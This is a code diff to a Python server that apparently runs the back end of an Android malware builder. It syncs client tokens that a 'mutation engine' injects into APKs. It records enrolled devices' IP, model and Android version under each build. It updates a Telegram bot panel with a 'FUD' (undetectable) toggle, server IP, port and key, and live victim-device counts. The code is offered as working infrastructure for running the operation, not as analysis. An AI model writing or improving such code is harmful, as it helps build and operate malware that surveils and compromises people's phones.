@@ -156,6 +156,86 @@ def init_db():
     conn.close()
     log.info(f"Database initialized: {DB_PATH}")
 
+    # ── Sync all active client tokens from bot.db → devices.db ───────────────
+    sync_clients_from_bot_db()
+
+
+def sync_clients_from_bot_db():
+    """
+    Sync all active client tokens from bot.db into devices.db clients table.
+    Called on server startup and after every build completion.
+    Ensures every APK token injected by the mutation engine is known to the
+    registration server — no manual DB inserts required.
+    Also patches any existing bot.db devices rows that have build_id=NULL
+    so device counts show correctly under each build.
+    """
+    try:
+        bot_db_path = os.path.join(os.path.dirname(__file__), "bot.db")
+        if not os.path.exists(bot_db_path):
+            return  # bot.db not present yet — skip silently
+
+        bot_db = sqlite3.connect(bot_db_path, timeout=5)
+        bot_db.row_factory = sqlite3.Row
+        rows = bot_db.execute(
+            "SELECT token, profile_name, active FROM clients WHERE token IS NOT NULL AND token != ''"
+        ).fetchall()
+
+        if not rows:
+            bot_db.close()
+            return
+
+        dev_db = sqlite3.connect(DB_PATH, timeout=5)
+        synced = 0
+        for row in rows:
+            dev_db.execute(
+                """INSERT OR IGNORE INTO clients
+                   (token, name, created_at, active)
+                   VALUES (?, ?, ?, ?)""",
+                (row["token"], row["profile_name"] or row["token"],
+                 int(time.time()), 1 if row["active"] else 0)
+            )
+            # Keep active flag in sync for existing rows
+            dev_db.execute(
+                "UPDATE clients SET active=? WHERE token=? AND active!=?",
+                (1 if row["active"] else 0, row["token"], 1 if row["active"] else 0)
+            )
+            synced += 1
+        dev_db.commit()
+        dev_db.close()
+        log.info(f"sync_clients_from_bot_db: synced {synced} client token(s)")
+
+        # ── Patch bot.db devices with NULL build_id ───────────────────────────
+        # Finds every device row missing a build_id and assigns it the latest
+        # build for that client. Fixes devices registered before this column
+        # was set, so counts show correctly in the bot's Build → Devices view.
+        null_devs = bot_db.execute(
+            """SELECT d.id, d.client_id, d.device_id
+               FROM devices d
+               WHERE d.build_id IS NULL"""
+        ).fetchall()
+
+        patched = 0
+        for d in null_devs:
+            build_row = bot_db.execute(
+                "SELECT id FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 1",
+                (d["client_id"],)
+            ).fetchone()
+            if build_row:
+                bot_db.execute(
+                    "UPDATE devices SET build_id=? WHERE id=?",
+                    (build_row["id"], d["id"])
+                )
+                patched += 1
+
+        bot_db.commit()
+        bot_db.close()
+        if patched:
+            log.info(f"sync_clients_from_bot_db: patched build_id on {patched} device(s)")
+
+    except Exception as e:
+        log.warning(f"sync_clients_from_bot_db error: {e}")
+
+
 def get_db():
     conn = sqlite3.connect(DB_PATH)
     conn.row_factory = sqlite3.Row
@@ -282,6 +362,95 @@ def health():
     return jsonify({"status": "ok", "ts": int(time.time())}), 200
 
 
+def _refresh_build_message(bot_db, build_id: int):
+    """
+    After a device registers, update the Devices count line in the existing
+    Telegram build detail message so the button becomes live immediately.
+    Reads chat_id + message_id from bot.db builds table and calls
+    Telegram editMessageText. Silent fail — never breaks registration flow.
+    """
+    try:
+        b = bot_db.execute(
+            "SELECT chat_id, message_id, build_number, template, status, "
+            "       package_name, apk_size, duration_secs, started_at, "
+            "       server_ip, server_port, server_key, client_id "
+            "FROM builds WHERE id=?", (build_id,)
+        ).fetchone()
+        if not b or not b["chat_id"] or not b["message_id"]:
+            return
+
+        total  = bot_db.execute(
+            "SELECT COUNT(*) as cnt FROM devices WHERE build_id=?",
+            (build_id,)).fetchone()["cnt"]
+        active = bot_db.execute(
+            "SELECT COUNT(*) as cnt FROM devices WHERE build_id=? AND status='active'",
+            (build_id,)).fetchone()["cnt"]
+
+        # Rebuild the build detail text (mirrors vaultguard_bot.py show_build_detail)
+        pkg      = b["package_name"] or "—"
+        size     = b["apk_size"] or "—"
+        dur      = f"{b['duration_secs']}s" if b["duration_secs"] else "—"
+        status   = "✅ SUCCESS" if b["status"] == "success" else b["status"].upper()
+        tmpl     = b["template"] or "—"
+        srv_ip   = b["server_ip"] or "—"
+        srv_port = b["server_port"] or "—"
+        srv_key  = b["server_key"] or "—"
+        date_str = (b["started_at"] or "")[:16]
+
+        text = (
+            f"📋 <b>Build #{b['build_number']}</b>\n"
+            f"{'─'*30}\n"
+            f"Client   : Foxxy(SamGod)\n"
+            f"Template : {tmpl}\n"
+            f"Status   : {status}\n\n"
+            f"📡 <b>Connection</b>\n"
+            f"IP       : {srv_ip}\n"
+            f"Port     : {srv_port}\n"
+            f"Key      : {srv_key}\n\n"
+            f"📦 <b>APK Info</b>\n"
+            f"Package  : {pkg}\n"
+            f"Size     : {size}\n"
+            f"Duration : {dur}\n\n"
+            f"🕐 Date  : {date_str} UTC\n"
+            f"{'─'*30}\n"
+            f"📱 Devices : {total} total  |  {active} active"
+        )
+
+        # Rebuild inline keyboard matching kb_build_detail in vaultguard_bot.py
+        fud_label = "🛡 FUD: Inherit (toggle)"
+        keyboard = {
+            "inline_keyboard": [
+                [
+                    {"text": "📱 Devices", "callback_data": f"devices_{build_id}_1"},
+                    {"text": "🔁 Rebuild",  "callback_data": f"rebuild_{build_id}"}
+                ],
+                [{"text": fud_label, "callback_data": f"toggle_build_fud_{build_id}"}],
+                [{"text": "📥 Get APK",    "callback_data": f"get_apk_{build_id}"}],
+                [{"text": "🗑 Delete Build","callback_data": f"delete_build_confirm_{build_id}_{b['client_id']}"}],
+                [
+                    {"text": "🔙 Back", "callback_data": f"builds_history_{b['client_id']}"},
+                    {"text": "🏠 Home", "callback_data": "nav_home"}
+                ]
+            ]
+        }
+
+        import urllib.request as _ureq
+        url  = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
+        data = json.dumps({
+            "chat_id":      b["chat_id"],
+            "message_id":   int(b["message_id"]),
+            "text":         text,
+            "parse_mode":   "HTML",
+            "reply_markup": keyboard
+        }).encode()
+        req = _ureq.Request(url, data=data,
+              headers={"Content-Type": "application/json"})
+        _ureq.urlopen(req, timeout=5)
+        log.info(f"_refresh_build_message: updated build #{b['build_number']} devices={total}")
+    except Exception as e:
+        log.debug(f"_refresh_build_message skipped: {e}")
+
+
 def _sync_device_to_bot_db(device_id: str, ip: str, token: str, is_new: bool,
                            model: str = "", manufacturer: str = "",
                            android_version: str = "", template: str = "",
@@ -311,14 +480,21 @@ def _sync_device_to_bot_db(device_id: str, ip: str, token: str, is_new: bool,
         now_dt = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
         enrolled_dt = datetime.fromtimestamp(enrolled_at, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S") if enrolled_at else now_dt
 
+        # Look up latest build_id for this client so device shows under correct build
+        build_row = bot_db.execute(
+            "SELECT id FROM builds WHERE client_id=? ORDER BY id DESC LIMIT 1",
+            (client_id,)
+        ).fetchone()
+        build_id = build_row["id"] if build_row else None
+
         if is_new:
             # INSERT OR IGNORE — same physical device never counted twice
             bot_db.execute("""
                 INSERT OR IGNORE INTO devices
-                    (client_id, device_id, ip, first_seen, last_seen, status,
+                    (build_id, client_id, device_id, ip, first_seen, last_seen, status,
                      model, manufacturer, android_version, template, enrolled_at)
-                VALUES (?, ?, ?, ?, ?, 'active', ?, ?, ?, ?, ?)
-            """, (client_id, device_id, ip, now_dt, now_dt,
+                VALUES (?, ?, ?, ?, ?, ?, 'active', ?, ?, ?, ?, ?)
+            """, (build_id, client_id, device_id, ip, now_dt, now_dt,
                   model, manufacturer, android_version, template, enrolled_dt))
         else:
             # Update last_seen + device info for returning device
@@ -332,8 +508,13 @@ def _sync_device_to_bot_db(device_id: str, ip: str, token: str, is_new: bool,
             """, (now_dt, ip, model, manufacturer, android_version, template, device_id))
 
         bot_db.commit()
-        bot_db.close()
         log.info(f"bot.db sync {'new' if is_new else 'update'}: device={device_id[:16]}... client_id={client_id}")
+
+        # Refresh Telegram build message with correct device count + live keyboard
+        if is_new and build_id:
+            _refresh_build_message(bot_db, build_id)
+
+        bot_db.close()
 
     except Exception as e:
         # Silent fail — never break main registration flow
@@ -679,6 +860,8 @@ def build_complete():
         bot_db.commit()
         bot_db.close()
         log.info(f"build_complete: chat_id={chat_id} build={build_number} pkg={package_name} size={apk_size} dur={duration_secs}s")
+        # Sync new client token into devices.db so APK registration succeeds
+        sync_clients_from_bot_db()
         return jsonify({"ok": True}), 200
 
     except Exception as e:
